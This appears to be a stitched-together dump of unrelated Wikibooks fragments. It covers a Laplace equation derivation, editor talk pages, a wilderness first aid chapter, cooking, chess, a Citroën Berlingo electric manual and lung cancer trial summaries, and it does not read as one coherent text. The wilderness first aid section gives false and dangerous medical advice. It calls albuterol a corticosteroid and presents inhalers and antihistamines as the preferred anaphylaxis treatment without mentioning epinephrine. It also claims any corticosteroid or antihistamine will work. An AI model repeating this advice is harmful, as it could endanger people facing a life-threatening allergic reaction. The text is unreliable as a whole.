:&lt;math&gt;\frac{1}{X}\frac{\partial^2 X}{\partial x^2}+\frac{1}{Y}\frac{\partial^2 Y}{\partial y^2}+\frac{1}{Z}\frac{\partial^2 Z}{\partial z^2}=0&lt;/math&gt;
Now, suppose we vary x without changing y. Then, the expression&lt;math&gt;\frac{1}{Y}\frac{\partial^2 Y}{\partial y^2}+\frac{1}{Z}\frac{\partial^2 Z}{\partial z^2}&lt;/math&gt; did not change, since that expression does not depend on x. Thus, we know that &lt;math&gt;\frac{1}{X}\frac{\partial^2 X}{\partial x^2}&lt;/math&gt; must be constant.
This becomes an ''ordinary'' differential equation, which is much easier to solve. In fact, it is either an exponential function, if the constant is positive, or a sinusoidal function, if the constant is negative. The sign of the constant has to be determined by the boundary conditions.
Since the Laplace Equation is linear, all superpositions of solutions will be one as well, and so the general solution will be an infinite sum (usually a Fourier Series) with an infinite many parameters, which are to be determined from the boundary conditions.

* Wikibooks is a collection of open-source textbooks. See [[WB:WIW|What is Wikibooks]] to find out what types of books are acceptable.
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window that will insert this, too; it looks like part of a signature.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!

== Tip on interwiki links ==

If you look at [http://en.wikibooks.org/w/index.php?title=Citro%C3%ABn_Berlingo_Electrique_Service_Manual&amp;diff=915061&amp;oldid=914641 this diff], you can see that I used the w: prefix to indicate that the link goes to Wikipedia; other than that, it's a normal internal link. For the prefixes of other wikis, look here: [[Help:Editing#Interwiki links]]. -[[User:Mike.lifeguard|Mike.lifeguard]] 06:00, 3 July 2007 (UTC)

== [[Sandbox Berlingo Service Manual]] ==

G'day, is this page meant to be your personal sandbox? If it is, you could have it as [[User:Arsharpe/sandbox]]. See, for example, my sandbox: [[User:Webaware/sandbox]]. If this is the case, can we please move the page into your user space? Otherwise, what is a &quot;Sandbox Berlingo&quot;?

On that page, you have links to images in Wikibooks, using full Internet URLs. If you just want to link to an image in Wikibooks, you can use this form: &lt;nowiki&gt;[[:Image:Name Of Image.png]]&lt;/nowiki&gt;. The wiki software will fill in the details for you.

Incidentally, there is already a collection of images for the Berlinger car on the Wiki Commons: [[commons:Category:Citroën Berlingo]]. You can use them in your book as if they were already part of Wikibooks - the wiki software will look for a local image, and when it doesn't find one, will look on the Commons.

== Sandbox Berlingo Service Manual (reply) ==

Hi,

Thanks for the information.
I have updated everything as requested.

Can you please indicate how to:-
   -rename an image without downloading/uploading, etc
   -merge (my) interim edits to improve readability.

Regards,
Rob

:G'day Rob, nice work. In answer to your questions:
:* An image cannot be renamed. You will need to upload it with the new name, and copy across the summary text and license information from the original upload. Once you've done that, tag the original upload for deleting by adding the following: &lt;code&gt;&lt;nowiki&gt;{{delete|why you want to delete}}&lt;/nowiki&gt;&lt;/code&gt; and one of the admins will take care of it when they can.
:* I don't know exactly what you mean in the second question - but generally, you can merge pages by copying text from one to another. If you are the only editor of the source page (i.e. copied ''from'' page), then just tag it for deleting as above; if someone else has been working on it, then you need to tag it with &lt;code&gt;&lt;nowiki&gt;{{now merged|page merged into}}&lt;/nowiki&gt;&lt;/code&gt; so that an admin can merge the edit histories. I suspect you are talking about merging your sandbox edits back into the main book, which you can do just by copying text to the main book and tagging your sandbox page for deleting.
:Let me know if this doesn't answer your questions, and I'll either try to address them better or find someone else who can! cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 11:58, 5 July 2007 (UTC)

Thanks,

Sorry, I did not explain very well.

An example should help.

I want to go from a page with the following history

 [version1] My initial version
 [version2] A minor edit
 [verison3] Another minor edit
 [version4] Yet another minor edit
 [version5] The final edit and happy with the result.

to 

 [version1] My initial version
 [version5] The final edit and happy with the result.

i.e. deleting version2-4

Thanks,
Rob

:G'day Rob. Don't worry about the old versions in the edit history, what is important is the current version. 
:In Wikibooks, we like to keep hold of all the old edit histories so that we can keep track of all contributors and their contributions, for various reasons including attribution under the [[WB:GFDL|GFDL]] and to prevent loss of information through accidental or malicious deletion. Deleting versions out of the edit history is thus not an easy task - one needs privileged access to do it, and a very good reason.
:Just keep editing your pages, and don't worry about the accumulating edit history. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 00:30, 6 July 2007 (UTC)

== Sandboxes! ==

Hi Rob - not quite sure I am with you here.  To start with the page I deleted (Public/Sandbox or similar) was created by an IP with nothing in the edit summary - that is usually indicative of a &quot;test&quot; type edit (which is of course what the [[Sandbox]] is for (hence my deletion).

What exactly is wrong with the current sandbox?  They exist as such on all Wikis and seem to serve the purpose ok.  The &quot;sandbox&quot; is a public one anyway.  Feel free to get back to me - cheers --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 10:33, 6 July 2007 (UTC)

==Image copyright problem with [[:Image:Brush.jpg]]==
 
Thanks for uploading [[:Image:Brush.jpg]].

== Check for Underlying Causes on [[First Aid/Vitals]] ==

I moved that section to [[First Aid/Head-to-toe]], but I'm wondering if it fits at all - it's certainly beyond SFA, and seems more like something that might be expected of a first responder or paramedic - definitely not a first aider. It might have a place in the [[First Aid/Advanced Topics]] chapter, as &quot;extended/advanced secondary assessment&quot; or something, but I thought I'd ask what you thought before moving it again or deleting it.

::The head-to-toe part of a secondary takes a while when done properly, and the stuff you added is really just advanced things to look for during a head-to-toe. So advanced, that I moved it to [[First Aid/Extended Assessment]]. Which I'm going to add some additional spinal-injury assessment stuff to. Seeing as you're a paramedic(?) you should proof that once I get it up.

I made some [http://en.wikibooks.org/w/index.php?title=First_Aid%2FB_for_Breathing&amp;diff=919949&amp;oldid=916393 big changes] to [[First Aid/B for Breathing]] because what you had added was (so far as I'm aware) wrong.

:So apparently the UK didn't go along with ILCOR. The point of this text is that it's international in nature - the main protocols should be from ILCOR, and the ones you sent to me (btw do you have a link so everyone else can see that pdf?) should be included as regional differences. Feel free to make a separate section for them, or use {{tlx|FA Regional Note}}. Note that those standards come from the Red Cross and SJA ''of the UK only''.

::Fair enough, although ILCOR do endorse my position on the use of 'D for defibrillation' under basic life support, so if we accept the initial rescue breaths, then we must change D to 'D for defibrillation'.  Sound fair? [[User:Owain.davies|Owain.davies]] 18:43, 13 July 2007 (UTC)

:::The endorsement is &quot;Use of AEDs by '''trained''' lay and professional responders is recommended...&quot; (emphasis mine). AED training is ''not'' part of CPR training - it is often an add-on, and is certainly something a lay rescuer can do, but is still part of advanced training, and should stay there. As I said elsewhere, ''getting an AED'' is covered under Ambulance (which won't exist until we restructure this chapter to match [[First Aid/CPR summary]]. ''AED use'' requires additional training, and is therefore located in the correct spot already.
:::As well, for obstructed airway procedures, it could certainly be integrated into CPR, but there are differences. After an unsuccessful attempt at ventilation, the rescuer readjusts the head-tilt chin-lift and reattempts. If the second attempt is unsuccessful, then the rescuer proceeds to 30 compressions followed by a foreign body check (visually check the airway and remove any obvious obstructions). If you want to merge it into [[First Aid/C for Compressions]] then go ahead, but make sure the sequence is correct. {{Done}} ''' &amp;ndash; [[User:Mike.lifeguard|&lt;font color=&quot;Indigo&quot;&gt;Mike.lifeguard&lt;/font&gt;]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|&lt;font color=&quot;Indigo&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 02:43, 16 July 2007 (UTC)
:::Airway is not a vital sign - it's part of the ABCs, which are an even higher priority. You're correct to emphasize keeping an open airway, but putting that in vitals is really a ''demotion'' which is inappropriate. If you want to re-emphasize checking ABCs continually ''along with'' vitals (which don't include airway) then that would be appropriate in the intro of [[First Aid/Vitals]].

:::Even the European Resuscitation Council (which is responsible for the protocols you cited that EMS comes after checking breathing and didn't use ILCOR's standards) agrees that BLS doesn't include AED: &quot;Basic life support (BLS) refers to maintaining airway patency and supporting breathing and the circulation, without the use of equipment other than a protective device.&quot; I think it's clear that we need to make sure the book is clear that AED/AED-trained responder needs to be summoned along with EMS and that AED takes priority over CPR, ''but'' AED use is going to stay in [[First Aid/Advanced Topics]].
:::As well, seeing as how ILCOR, AHA, LSS, SJAC and CRC (at a minimum) agree that ambulance comes before airway, I'll change it back to what I had and insert a {{tlx|FA Regional Note}} that it's different in Europe.

{{FA Advanced Topics}}

'''Wilderness first aid''' is the practice of first aid where definitive care is more than one hour away, and often days to weeks away. The practice of wilderness first aid is defined by difficult victim access, limited equipment, and environmental extremes. As such, care can differ radically from that which is provided in other situations. Unlike other areas, those providing care in the wilderness are literally on their own. In the wilderness, independence and preparedness are absolutely crucial, as it may mean the difference between life and death.  

==Anaphylactic Shock==
{{FA Caution|'''Make certain''' that the patient is not allergic to medication before dispensing.}}
Anaphylactic shock is where the airway rapidly constricts and is always a serious life threatening condition. It is generally a reaction to allergens and must be treated immediately. Even if the reaction stops, seek medical attention, because return of symptoms has been documented. In a wilderness setting, anaphylactic shock is handled differently, as medical attention is generally not available. The biggest difference is that medications are used, where in any other setting, this might not be the case.  

# Eliminate or minimize allergen contact. 
# Keep the patient calm 
# Treat for shock
# Tilt patient's head back to keep the airway open 
# Use a rescue inhaler with albuterol. (Preferred)
# Administer chlorphenamine (Chlor-Trimeton) or diphenhydramine (Benadryl) according to dosing instructions. If available, administer corticosteroids like prednisone.
# Evacuate the patient to the nearest medical facility '''immediately'''


The biggest key to treating anaphylactic shock is that the airway must be kept open. To prevent the airway from closing, the preferred method is to administer albuterol. This is the base component of rescue inhalers. Albuterol is a cortiocosteroid that works by increasing respiration, allowing more air to be taken in to compensate for the restricted airway. After albuterol is administered, diphenhydramine should be administered in accordance with the dosing instructions until the patient arrives at a medical facility. ANY CORTIOCOSTEROID OR ANTIHISTAMINE WILL WORK.

==Animal bites==
{{FA Caution|Lack of symptoms does not mean that an animal does not have rabies!}}
'''Know the venomous animals in your area.'''

Animal bites can vary in severity from minor to major. Different approaches should be taken depending on the animal. For example, mammal bites may result in rabies. Rabid animals will present with unusual behavior and aggression, but this does not always occur. Nocturnal animals that are moving around during the day should always be considered rabid as should  bats and raccoons. 

For all '''mammal''' and '''nonvenomous''' insect/snake bites, 

# Stop bleeding by applying pressure to the affected area's blood supply (if necessary) 
# Wash the bite area immediately (with soap if possible)
# Apply antiseptic (iodine/neosporin/triple antibiotic)
# Bandage the bite loosely
# Keep the affected area clean
# Treat for shock (if necessary)

It is important that you monitor the patient's condition and take any appropriate actions. When rabies is a possibility, seek medical attention as soon as possible. If possible, attempt to have the animal caught for testing. If the animal has to be killed, preserve the head. Provided that treatment is provided promptly, rabies can generally be stopped by post exposure prophalaxis (P.E.P.). If the patient reports fever, headache, or malaise, they need to be evacuated to medical attention as soon as possible.      
===Snakes===
Many snake bites, even by venomous snakes, are not envenomed, and these can be treated as normal animal bites. Rabies is never a consideration as only mammals can carry the rabies virus. 

There are four main categories of venomous snakes. Snakes are classed as cobras, coral snakes, kraits, and vipers. Snake identification is extremely important to determine which antivenin to give and the treatment method that is necessary. Some polyvalent antivenins are available, but not in every hospital.  

Croatilid (pit-viper, such as rattlesnake) venoms cause the bitten area to turn green or purple. Elapid (coral and many other non-U.S. snakes) venoms cause swollen lymph nodes. If symptoms appear; clean with soap and water, keep affected area lower than the heart, never put a cold compress on the bite area as recent research has shown this can possibly cause more harm, and evacuate the victim, on a litter if possible. If a victim is unable to reach medical care within 30 minutes, a bandage, wrapped two to four inches above the bite, may help slow venom. The bandage should not cut off blood flow from a vein or artery. A good rule of thumb is to make the band loose enough that a finger can slip under it.

The first aid for Australian elapid snake bites is the same as that used for Funnelweb Spiders, cone shells or Blue-ringed Octopus bites (see section below on spiders); the bandage should be as tight or tighter than that used for a sprain. Never wash the bite site for bites from Australian elapid snakes. This is because in Australia there is a Snake Venom Detection Kit (SVDK)(produced by Commonwwealth Serum Laboratories Ltd), which used swabs from the bite site to obtain minute samples of snake venom; these samples are then tested in the SVDK, which is a simple and effective ELISA assay, to determine whether the venom comes from the Brown Snake (Pseudonaja sp), Black Snake (Pseudechis sp), Taipan (Oxyuranus sp), Death Adder (Acanthophis sp) or Tiger Snake (Notechis sp) groups. This can tell the treating physician which of the 5 CSL antivenoms to use; antivenom is only administered if the patient shows definite signs and symptoms of clinical envenoming. Some other Australian elapid species such as Whip Snakes (Demansia sp), Broad-head Snakes (Hoplocephalus spp) and others may give unusual results with the SVDK. There are also many highly venomous Sea Snake species occurring in Australian waters, partciularly the tropical regions; there is also a CSL antivenom for sea snakes.

===Spiders===
While all spiders have venom, only a handful can cause problems in humans. Nonvenomous bites should be treated by washing the bite and applying antiseptic.  

The Sydney funnel-web spider of Australia is one spider that frequently dangerous to adults, and it resides only within 100 miles of Sydney, Australia. Treatment is identical to that of a [[#Snakes|snake-bite]]. The first aid treatment for the Sydney Funnelweb Spider (Atrax robustus) and closely-related dangerous Australian Funnelweb spiders such as Hadronyche versuta, Hadronyche formidabilis and Hadroyche infensa is the same as the first aid for Australian elapid snake bite. However, this treatment differs from the US technique mentioned above for coral snakes. The symptoms of envenomation by the dangerous Australian elapid snakes may include neurotoxicity (nervous system disorders, coagulopathy (blood clotting problems), Myotoxicity (effects on muscle tissue), general systemic symptoms, and occasionally death. The method used in Australia for first aid for elapid snake bites (e.g. Common Brown Snake (Pseudonaja textilis), Taipan (Oxyuranus scutellatus) and others is the Pressure-Immobilisation Technique. This is the technique recommended by the Australian Resuscitation Council and endorsed by medical authorities and the major authoritative Australian national first aid organizations such as Red Cross Australia, St John Ambulance Australia and Surf Lifesaving Australia. It has been shown to be effective. For a description of this technique see the Australian Venom Research Unit website at http://www.avru.org/firstaid/firstaid_snake.html and http://www.avru.org/firstaid/firstaid_pib.html, or the CSL Antivenom Handbook at http://www.toxinology.com/generic_static_files/cslb_index.html.

In North America, the Brown Recluse and Black Widow spiders are considered dangerous to humans. While effects may not be as pronounced in adults, untreated bites in children and the elderly have a high probability of fatality. It is strongly recommended that all bite victims receive prompt medical attention and the administration of antivenin to prevent nerve and skin damage. Although toxins are different, treatment is the same. 

# Treat for shock 
# Capture spider if safe/possible
# Clean and expose the bite
# Transport to hospital

===Ticks===
[[Image:Ticks 1.jpg|thumb|A female (large) and male (small) tick.]]
Ticks are small parasitic arachnids.  They are generally black, gray, brown, red or a combination of these colors. They require the blood of mammals to survive. When hungry, they are extremely small and difficult to see. As they feed on a host, their body expands and they become more noticeable. Normally ticks wouldn't be a problem, but they have been identified as a vector for disease. Tick Encephalitis, Lyme Disease and Rocky Mountain Spotted Fever can be spread by an infected tick. Also, the opening they create in the skin provides easy access to the body for airborne pathogens. 

The best way to prevent these diseases is to make it difficult for ticks to attach to your skin. Minimizing the amount of skin visible will minimize the amount of skin for ticks to feed on. Check before you travel to see if ticks are a known danger in your area. When you stop in a tick infested area, have a partner do a visual inspection for them. This can further aided by wearing light colored clothing, which makes ticks stand out more. Avoid brushing against hanging foliage as ticks love to wait there for a host to come along.   

Generally, medical attention is not necessary to handle tick bites. However when you discover a tick, effort should be made to remove it as soon as possible. If you are unable to remove it and it does require medical attention, seek such attention promptly. Every moment that the tick remains in your body increases the chances of getting a disease.

# Gently grasp the tick's mouthparts with forceps - be very careful not to grab the body.
# Pull the mouthparts straight back in the direction they entered the skin with even pressure
# The mouthparts are quite difficult to remove, and are often very long; be patient and use steady, even pressure
# Pull gently but firmly; if you pull with too much force, you will detach the mouthparts from the rest of the tick. If the mouthparts stay embedded in the skin, they can very easily kindle an infection
# Do not use substances such as nail polish remover or bug spray
# Flame can be used (if accepted in your area) 
# If you ''must'', use fingernails to grasp the tick's mouthparts
# Wash the area and your hands thoroughly with soap and water once you've finished
# Wipe area with antiseptic/antibiotics
# Bandage and keep the bite clean 

Using antiseptic or antibiotic on a bite decreases the chances of infection, but antibiotic prophalaxis is recommended.

== Rabies ==

I was under the impression that rabies could be transmitted by pretty much any mammal, not just carnivores.  Also, it can be transmitted by rodents:

[http://www.wmur.com/news/13580882/detail.html This link] is a story that ran on on the news in my area last week about a girl who was bitten by a rabid ground hog.  [[W:Ground hog|Ground hogs]] are in fact members of the rodent family. --[[User:Jomegat|Jomegat]] 20:01, 1 July 2007 (UTC)

      <text xml:space="preserve">We have a dramatically different (and, I must admit, simpler) recipe for a rarebit.  It's been in the family (and in America) for well over a century, though we're not sure where it comes from, exactly.  We've never called it &quot;Welsh&quot;, though—and as (virtually) no one in the US has ever heard of rarebits, it was a bit of a startling discovery to find that another more or less similar dish exists by the name &quot;Welsh rarebit&quot; (and was common in the UK, to boot).

Here Black has taken a pawn, but although both black and white have 2 developed pieces, the white rook on f1 and white's queen have more mobility, and white is already castled.  Because of white's slight lead in  development he is playing d4 to further open the position and make better use of his better development

      <text xml:space="preserve">Hi Deborancragun, 
I'm a doctoral student at Indiana University. I'm currently working on a Wikibook research study about online authors' experiences and perceptions with my advisor. I read your Wikibook of introduction to sociology. It's very impressive. We would like to learn more from your and Rcragun' experiences. 

If you would like to participate in the case study, please contact me by email or leave a message. We'll discuss the detailed information about the study. (The format will be a one hour interview in person or by phone or email) 

Your input will be greatly appreciated. 
Best regards,
inkeys

Hi there, my name is Martin M. Elissetche. I'm a PhD student at the University of Maryland and the creator of a social science dictionary located at www.socialsciencedictionry.org. I wanted to know if I could place a copy of your book on my web site or whether you prefer if I just link to it. Please let me know what you think at info@socialsciencedictionary.org. Cheers, m.</text>

__NOTOC__
==Ignition On Mode==
When the ignition is switched on no additional lights are displayed (other than the parking brake and the [Stop] light. This is unusual for a car and means that it is not easy to check the bulb status.

==Driving Tips==
When using regenerative braking the brake lights do not illuminate.  Care should be taken be taken when decelerating quickly using regenerative braking that cars following have sufficient notice, maybe by lightly touching the brakes to operate the brake lights.

==The Electrical Fault Lamp==
The original manual says that the Electrical Fault Lamp

*Comes on when a fault is detected by the ECU.
*Contact an approved dealer as soon as possible to switch of the lamp.

The lamp may sometimes be reset by performing a complete charge.

'''Slow Cookers''' or '''Crock Pots'''© have been increasing in popularity ever since the early 1980s, especially with busy families away from home most of the day in developed countries. The slow cooker is loaded in the morning and may be left unattended all day, if set to cook on &quot;Low.&quot; The heat emanates from the sides, and will provide a delicious meal in the evening.

The simpler cookers have an on/off switch, and the more sophisticated ones have digital, programmable thermostats. Most models have a &quot;Low&quot; setting and a &quot;High&quot; setting.

One of the best uses of slow cookers is for making the toughest kinds of meats tender. The number of uses, however, is only limited by the imagination: soups, vegetable, stews, ... even a pile of [[Cookbook:Hot Dog|hot dogs]] can be throw in, and an hour or two later, they'll be delicious!

Old stoves have a recessed cooking position, often in the right rear, in which a pot can sit. This has a similar function.

'''Non-Small Cell Lung Cancer Randomized'''
&lt;br&gt;In process of being cross-linked ...


==Early Stage Operable NSCLC==
===Primary surgery vs. primary RT===
*'''Medical Research Council/Hammersmith Hospital''' (1954-1958) -- RT vs Surgery
**Randomized. 58 patients, no clinical or radiologic evidence of mediastinal involvement. Biopsy proven carcinoma. Arm 1) RT - using 8 MeV linac, 45 Gy in 4 weeks daily. Target + 2cm + hilar/mediastinal areas; vs. Arm 2) Surgery - pneumonectomy or lobectomy + hilar/mediastinal LND. However 13/30 weren't operable/refused. Histology squamous 64%, adenocarcinoma 3%, small cell/anaplastic 33%
**'''1963''' PMID not available, doi:10.1016/S0140-6736(63)91444-2 --&quot;THE TREATMENT OF CARCINOMA OF THE BRONCHUS A Clinical Trial to Compare Surgery and Supervoltage Radiotherapy&quot; (Morrison R, Lancet. 1963. Mar 30; 281(7283):683-684)
***Outcome: 1-year OS RT 64% vs. Surgery 43%; 2-year OS 14% vs. 27%; 4-year 7% vs. 23% (NS). By histology: squamous 6% vs. 30% (SS); small cell 10% both (NS)
***Conclusion: In squamous cell tumors, surgical resection is significantly better than RT; no difference in small cell.

===Limited resection vs. lobectomy===
*'''North American Lung Cancer Study Group 821''', 1995 (1982-88)- PMID 7677489 &amp;mdash; &quot;Randomized trial of lobectomy versus limited resection for T1 N0 non-small cell lung cancer.&quot; Ginsberg RJ et al. Ann Thorac Surg. 1995 Sep;60(3):615-22
**Randomized. 247/276 patients with peripheral pT1N0. Treated with limited resection (segmental resection or large wedge with 2cm margin)
**Locoregional recurrence: limited resection 17% vs. lobectomy 6% (SS, 3x higher). Death rate: 39% vs. 30% (NS)
**Tumor volume: lobectomy better, regardless of tumor size (&lt;3 cm3, 3-8 cm3, 8-27 cm3)
**Toxicity: perioperative morbidity, mortality, and late post-op pulmonary function comparable
**Conclusion: Higher LR and death rate, without improved post-op function

===Pre-op RT vs Surgery Alone===
*'''Nijmegen''' (The Netherlands)(1971-1976) -- Pre-op Mediastinal RT vs Surgery Alone
**Randomized, pilot. 33 patients, clinical T1-2N0 NSCLC, mediastinoscopy LN-. Arm 1) Pre-op RT 20/5 to hilar, subcarinal, tracheo-bronchial, and paraesophageal LNs followed by surgery following Monday vs. Arm 2) Surgery alone. Either lobectomy or pneumonectomy
**'''1984''' PMID 6378851 -- &quot;Evaluation of short-course preoperative irradiation in the treatment of resectable bronchus carcinoma: long-term analysis of a randomized pilot-study.&quot; (Kazem I, Int J Radiat Oncol Biol Phys. 1984 Jul;10(7):981-5.) Minimum F/U 7 years
***Outcome: 5-year OS pre-op RT 58% vs. surgery alone 43%; 5-year DSS 78% vs. 67% (NS); median OS 6 years vs. 2.5 years. R0 resection in pre-op 57% vs surgery only 28%
***Subgroup analysis: If lobectomy, RT beneficial only during first year, then no difference. If pneumonectomy, RT beneficial during entire follow-up (5-year OS 66% vs. 42%).
***Toxicity: 9% operative mortality (all patients in surgery only arm); delayed wound healing comparable
***Conclusion: Pre-op RT well tolerated, and results are encouraging

*'''Germany''' 
**Randomized. 196 operable patients. Arm 1) Pre-op RT 5500 RHD (Co-60) vs. Arm 2) Surgery only
**'''1975''' PMID 173257 -- &quot;[Results of a controlled clinical trial for evaluation of intensive preoperative irradiation in operable bronchial cancer (author's transl)] - [Article in German]&quot; (Eichhorn HJ, Arch Geschwulstforsch. 1975;45(4):376-84.)
***Outcome: No difference in annual survival. Significantly reduced LR rate
***Toxicity: Post-op mortality and complications &quot;a bit more favorable&quot;
***Conclusion: No difference

*'''NCI Trial''' (1963-1966) -- Pre-op RT vs. Surgery only
**Randomized. 17 institutions. 568 patients operable (no carina, no mediastinum/SCV, no chest wall invasion). Arm 1) immediate surgery vs. Arm 2) Pre-op RT, given as &gt;40 Gy supravoltage 
**'''1975''' PMID 171057 -- &quot;Preoperative irradiation of cancer of the lung: final report of a therapeutic trial. A collaborative study.&quot; (Warram J, Cancer. 1975 Sep;36(3):914-25.)
***Outcome: 5-year OS pre-op RT 13% vs. surgery 16% (NS); 5-year RFS 11% vs. 14% (NS)
***Toxicity: Post-op mortality in surgery alone 11%, not estimated for pre-op RT group
***Conclusion: No difference

===Surgery +/- adjuvant EBRT===
*'''Rome''' (Italy)(1989-1997)
**Randomized. 104 patients with Stage I only. Surgery +/- RT (corrected 50.4/28 to bronchial stump and homolateral hilum; mean treated area 50 cm2)
**'''2002''' PMID 11830308 -- &quot;Adjuvant radiotherapy in non-small cell lung cancer with pathological stage I: definitive results of a phase III randomized trial.&quot; (Trodella L, Radiother Oncol. 2002 Jan;62(1):11-9.)
***5-year outcome: OS: RT 67% vs. observation 58% (p=0.048); LR: 2% vs. 23%
***Toxicity: 11% acute toxicity; no long term clinical toxicity, 37% radiographic fibrosis
***Conclusion: RT gave good results in LC, promising OS and DFS

*'''Beijing''' (China) (1982-95)
**Randomized. 366 pts, positive N1 or N2 nodes after surgery. Randomized to RT 60 Gy vs no further therapy. Field included bronchial stump, ipsilateral hilum, and most of the mediastinum; included SCLV for pts with upper mediastinal node involvement; mediastinum down to diaphragm for lower lobe primary.
**'''2000''' PMID 10863061 &amp;mdash; &quot;A study of postoperative radiotherapy in patients with non-small-cell lung cancer: a randomized trial.&quot; Feng QF et al. Int J Radiat Oncol Biol Phys. 2000 Jul 1;47(4):925-9.
***3-yr OS (51.9% vs 50.2%), 5-yr OS (42.9% vs 40.5%), not S.S. Trend toward improved OS in T3-4 and N1 pts receiving RT. 
**Comments: More pts with N2 disease in RT group (45% vs 27%)

*'''GETCB''' (France)(1986-94)
**Randomized. 728 pts (Stage I-III) randomized after resection to RT 60 Gy or observation.
**'''1999''' PMID 10421262 &amp;mdash; &quot;A controlled study of postoperative radiotherapy for patients with completely resected nonsmall cell lung carcinoma. Groupe d'Etude et de Traitement des Cancers Bronchiques.&quot; Dautzenberg B et al. Cancer. 1999 Jul 15;86(2):265-73.
***5-yr OS 30% (RT) vs 43% (Obs). Excess mortality due to increase in intercurrent deaths (31% vs 8%). More intercurrent deaths for higher dose per fraction. ON subgroup analysis, detrimental effect of RT significant in Stage I-II but not Stage III. No effect on local recurrences or distant mets. 
**Critique: included N0 patients, majority treated with Co-60, with fractions up to 2.5 Gy/fx

*'''Graz''' (Austria)(1985-1995)
**Randomized. 155 pts, pT1-3 pN0-2. Randomized to RT 50 Gy (if pN0) or 56 Gy (if pN1-2) vs no further treatment. Treatment included the bronchial stump + 2cm margin, ipsilateral hilum, and mediastinum; SCLV included for apical tumors. 2F AP/PA or 3F with off-cord after 42 Gy
**'''1997''' PMID 9377958 [http://www.chestjournal.org/cgi/reprint/112/4/954 Full text] &amp;mdash; &quot;Postoperative radiotherapy in radically resected non-small cell lung cancer.&quot; Mayer R et al. Chest. 1997 Oct;112(4):954-9.
***5-yr outcome: OS: RT 30% vs observation 20% (NS). DFS: 20% vs. 16% (NS). LR 6% vs. 24% (SS)
***Conclusion: Significant reduction in local recurrences, tendency to OS benefit

*'''Medical Research Council''' (1986-93)
**Randomized. 308 pts. Were pN1 or pN2. Randomized after surgery +/- RT 40 Gy in 15 fx. 
**'''1996''' PMID 8761382 &amp;mdash; &quot;The role of post-operative radiotherapy in non-small-cell lung cancer: a multicentre randomised trial in patients with pathologically staged T1-2, N1-2, M0 disease. Medical Research Council Lung Cancer Working Party.&quot; Stephens RJ et al. Br J Cancer. 1996 Aug;74(4):632-9.
***Overall, no survival difference. On subgroup analysis, trend to survival benefit for N2 pts (21% vs 36% at 3 yrs, p=0.18). No benefit in N1 pts.

*'''France''' (1985-91)
**Randomized. 163 pts, T2N0. Randomized to RT 60 Gy or no further treatment.

***Local recurrences were reduced: 20% vs 1% local failure, but overall treatment failures were the same. 
***Conclusion: Improved LR, but no effect on survival.

*'''Van Houtte''' (1966-1975)
**224 pts. N0. Randomized after resection to RT (60 Gy) vs observation.
***'''1980''' PMID 6998936 &amp;mdash; &quot;Postoperative radiation therapy in lung cancer: a controlled trial after resection of curative design.&quot; Van Houtte P et al. Int J Radiat Oncol Biol Phys. 1980 Aug;6(8):983-6. 
***Survival was worse in the RT group: 5-ys OS 24% vs 43% (NS).


===Surgery +/- adjuvant chemotherapy===
*'''CALGB 9633''' (1996-2003) -- Surgery +/- paclitaxel and carboplatin
**Randomized. ''Stopped early after interim analysis showed survival benefit.'' 344 patients (target 500). NSCLC, T2, pN0 by mediastinoscopy, resected with lobectomy/pneumonectomy. Arm 1) adjuvant paclitaxel 200 mg/m2 + carboplatin AUC 6 Q3W x4 cycles vs. Arm 2) observation. Primary endpoint OS
**'''2008''' PMID 18809614 -- &quot;Adjuvant Paclitaxel Plus Carboplatin Compared With Observation in Stage IB Non-Small-Cell Lung Cancer: CALGB 9633 With the Cancer and Leukemia Group B, Radiation Therapy Oncology Group, and North Central Cancer Treatment Group Study Groups.&quot; (Strauss GM, J Clin Oncol. 2008 Sep 22. [Epub ahead of print]) Median F/U 6.2 years
***Outcome: median OS chemo 7.9 years vs. observation 6.5 years (NS); 5-year OS 60% vs. 58% (NS); 5-year DFS 52% vs. 48% (NS). Subgroup analysis: survival difference for tumors &gt;=4cm
***Toxicity: Grade 3/4 neutropenia in 35%
***Conclusion: Negative trial, adjuvant chemo should not be standard of care in Stage IB. Survival advantage for large tumors on subset analysis

*'''International Adjuvant Lung Trial (IALT)''' (1995-2000) -- Surgery +/- cisplatin and vinca alkaloids
**Randomized. ''Terminated early due to slow accrual.'' 1867 patients (target 3300). Stages I-III (Stage I 36%, Stage II 24%, Stage III 40%), complete resection. Arm 1) Adjuvant cisplatin with either etoposide (in 56%) or vinca alkaloid (vinorelbine, vinblastine, vindesine) x3-4 cycles. ~25% also received RT based on institutional preference. 
**'''2004''' PMID 14736927 &amp;mdash; &quot;Cisplatin-based adjuvant chemotherapy in patients with completely resected non-small-cell lung cancer.&quot; Arriagada R et al. N Engl J Med. 2004 Jan 22;350(4):351-60. Median F/U 4.7 years
